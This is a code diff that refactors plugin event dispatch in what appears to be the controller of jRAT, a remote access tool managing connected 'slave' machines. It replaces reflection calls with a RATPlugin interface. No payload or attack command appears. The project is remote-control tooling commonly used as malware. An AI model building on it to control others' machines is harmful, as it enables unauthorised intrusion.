@@ -1,6 +1,7 @@
 package se.jrat.controller.addons;
 
 import jrat.api.Packet;
+import jrat.api.RATPlugin;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisconnectEvent;
 import jrat.api.events.OnPacketEvent;
@@ -10,9 +11,9 @@ import se.jrat.controller.AbstractSlave;
 public class PluginEventHandler {
 
 	public static void onPacket(AbstractSlave slave, byte header) {
-		for (Plugin plugin : PluginLoader.plugins) {
+		for (RATPlugin plugin : PluginLoader.getPlugins()) {
 			try {
-				plugin.getMethods().get(Plugin.ON_PACKET).invoke(plugin.getInstance(), new Object[] { new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header)) });
+				plugin.onPacket(new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
@@ -20,9 +21,9 @@ public class PluginEventHandler {
 	}
 
 	public static void onConnect(AbstractSlave slave) {
-		for (Plugin plugin : PluginLoader.plugins) {
+		for (RATPlugin plugin : PluginLoader.getPlugins()) {
 			try {
-				plugin.getMethods().get(Plugin.ON_CONNECT).invoke(plugin.getInstance(), new Object[] { new OnConnectEvent(RATObjectFormat.format(slave)) });
+				plugin.onConnect(new OnConnectEvent(RATObjectFormat.format(slave)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
@@ -30,9 +31,9 @@ public class PluginEventHandler {
 	}
 
 	public static void onDisconnect(AbstractSlave slave) {
-		for (Plugin plugin : PluginLoader.plugins) {
+		for (RATPlugin plugin : PluginLoader.getPlugins()) {
 			try {
-				plugin.getMethods().get(Plugin.ON_DISCONNECT).invoke(plugin.getInstance(), new Object[] { new OnDisconnectEvent(RATObjectFormat.format(slave)) });
+				plugin.onDisconnect(new OnDisconnectEvent(RATObjectFormat.format(slave)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
@@ -40,9 +41,9 @@ public class PluginEventHandler {
 	}
 
 	public static void onSendPacket(byte header, AbstractSlave slave) {
-		for (Plugin plugin : PluginLoader.plugins) {
+		for (RATPlugin plugin : PluginLoader.getPlugins()) {
 			try {
-				plugin.getMethods().get(Plugin.ON_SEND_PACKET).invoke(plugin.getInstance(), new Object[] { new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave)) });
+				plugin.onSendPacket(new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
